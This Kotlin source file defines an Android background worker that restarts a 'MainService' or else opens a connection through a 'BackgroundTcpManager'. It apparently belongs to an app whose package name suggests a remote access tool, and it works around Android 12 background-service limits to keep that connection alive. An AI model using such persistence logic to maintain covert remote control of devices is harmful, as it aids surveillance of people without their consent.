package com.techsky.skyrat

import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters

class ServiceRestartWorker(
    private val context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    companion object {
        private const val TAG = "ServiceRestartWorker"
    }

    override suspend fun doWork(): Result {
        Log.d(TAG, "ServiceRestartWorker executing")

        return try {
            // Try to start as foreground service if possible
            if (canStartForegroundService()) {
                val serviceIntent = Intent(context, MainService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent)
                } else {
                    context.startService(serviceIntent)
                }
                Log.d(TAG, "Successfully restarted MainService")
            } else {
                // Fall back to BackgroundTcpManager
                Log.d(TAG, "Cannot start service, using BackgroundTcpManager")
                val backgroundManager = BackgroundTcpManager(context)
                backgroundManager.startConnection()
            }

            Result.success()

        } catch (e: Exception) {
            Log.e(TAG, "ServiceRestartWorker failed: ${e.message}", e)

            // Try BackgroundTcpManager as last resort
            try {
                val backgroundManager = BackgroundTcpManager(context)
                backgroundManager.startConnection()
                Result.success()
            } catch (fallbackException: Exception) {
                Log.e(TAG, "All restart methods failed: ${fallbackException.message}")
                Result.retry()
            }
        }
    }

    private fun canStartForegroundService(): Boolean {
        // Check if we can start foreground service based on Android version and app state
        return when {
            Build.VERSION.SDK_INT < Build.VERSION_CODES.O -> true
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.S -> {
                // Android 12+ has stricter rules
                false // Safer to use BackgroundTcpManager
            }
            else -> {
                // Android 8-11: Try, but handle exceptions
                true
            }
        }
    }
}